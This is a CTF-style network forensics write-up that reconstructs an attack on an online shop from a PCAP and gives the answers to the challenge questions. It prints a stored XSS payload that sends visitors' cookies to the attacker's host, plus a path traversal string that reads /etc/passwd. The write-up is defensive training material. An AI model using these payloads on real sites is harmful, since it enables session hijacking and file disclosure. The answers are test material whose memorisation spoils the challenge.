# RetailBreach – Stored XSS and Path Traversal

# Scenario & Objective

An online shop noticed odd activity around its customer reviews and admin area. I get a PCAP of the traffic and have to find the attacker, the tools he used and what he managed to do.

- **Category**: Network Forensics
- **Tools**: Wireshark, CyberChef, IP geolocation lookup

## Overview

The attacker is `111[.]224[.]180[.]128` (ChinaNet Hebei, Shijiazhuang, China), talking to the web server `73[.]124[.]17[.]52` (host `shopsphere.com`, Apache 2.4.52 on Ubuntu) around 12:01 UTC on 29 March 2024. He first scanned the site with `gobuster/3.6`, then posted a review containing a stored XSS payload that sends visitors' cookies to him, and finally used path traversal on the admin log viewer to read `/etc/passwd`.

# Analysis

I started with the conversations. The biggest one is between `111[.]224[.]180[.]128` and the web server `73[.]124[.]17[.]52`, around 14,500 packets and 4 MB. A lookup puts the attacker at ChinaNet Hebei, in Shijiazhuang, China (AS4134).

<p align="center">
  <img src="./images/image1.png" alt="Conversations: attacker and web server" /> <br />
  <em>Image 1: Conversations: attacker and web server</em>
</p>

<p align="center">
  <img src="./images/image2.png" alt="IP lookup: ChinaNet Hebei, China" /> <br />
  <em>Image 2: IP lookup: ChinaNet Hebei, China</em>
</p>

HTTP stream 29 is where the enumeration is visible. The `User-Agent` is `gobuster/3.6` and the server banner is `Apache/2.4.52 (Ubuntu)`, with a response date of Fri, 29 Mar 2024 12:01:41 GMT.

<p align="center">
  <img src="./images/image3.png" alt="Stream 29: User-Agent: gobuster/3.6" /> <br />
  <em>Image 3: Stream 29: <code>User-Agent: gobuster/3.6</code></em>
</p>

Next, the part that looked more interesting was a `POST /reviews.php` to host `shopsphere.com` in stream 96. The body is URL-encoded, so I decoded it in CyberChef (*URL Decode*) and it turned out to be a `<script>` that calls `fetch()` on the attacker's server with `document.cookie` appended. This is a stored XSS: anyone who opens that review, for example an admin, sends the session cookie to the attacker.

<p align="center">
  <img src="./images/image4.png" alt="Stream 96 in the packet list" /> <br />
  <em>Image 4: Stream 96 in the packet list</em>
</p>

<p align="center">
  <img src="./images/image5.png" alt="POST /reviews.php with an encoded payload" /> <br />
  <em>Image 5: <code>POST /reviews.php</code> with an encoded payload</em>
</p>

<p align="center">
  <img src="./images/image6.png" alt="CyberChef *URL Decode* shows the <script> payload" /> <br />
  <em>Image 6: CyberChef *URL Decode* shows the <code>&lt;script&gt;</code> payload</em>
</p>

<p align="center">
  <img src="./images/image7.png" alt="Filter for requests carrying reviews.php" /> <br />
  <em>Image 7: Filter for requests carrying <code>reviews.php</code></em>
</p>

After that, I limited the packet list to the attacker's HTTP traffic later in the capture (`ip.src == <attacker> && http && frame.number > 10106`). In stream 111 there is a request to the admin log viewer with the parameter `file=../../../../../etc/passwd`, a classic path traversal that reads files outside the intended folder.

<p align="center">
  <img src="./images/image8.png" alt="Packet list after the XSS stage" /> <br />
  <em>Image 8: Packet list after the XSS stage</em>
</p>

<p align="center">
  <img src="./images/image9.png" alt="Filter ip.src == attacker && http && frame.number > 10106" /> <br />
  <em>Image 9: Filter <code>ip.src == attacker &amp;&amp; http &amp;&amp; frame.number &gt; 10106</code></em>
</p>

<p align="center">
  <img src="./images/image10.png" alt="Stream 111: log_viewer.php?file=../../../../../etc/passwd" /> <br />
  <em>Image 10: Stream 111: <code>log_viewer.php?file=../../../../../etc/passwd</code></em>
</p>

ATT&CK mapping: T1595.003 (wordlist scanning with gobuster), T1190 (public-facing application), T1539 (cookie theft) and T1005 for the file read.

# Answer the Questions

**Q1: Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?**

`111[.]224[.]180[.]128`

**Q2: The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?**

`gobuster` (`gobuster/3.6` in the User-Agent).

**Q3: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?**

`<script>fetch('hxxp[://]111[.]224[.]180[.]128/' + document.cookie);</script>`, stored through `POST /reviews.php`.

**Q4: Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?**

`2024-03-29 12:09` UTC (12:09:50 in the packet list).

**Q5: The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?**

`lqkctf24s9h9lg67teu8uevn3q`

**Q6: Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?**

`log_viewer.php`

**Q7: Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?**

`../../../../../etc/passwd`
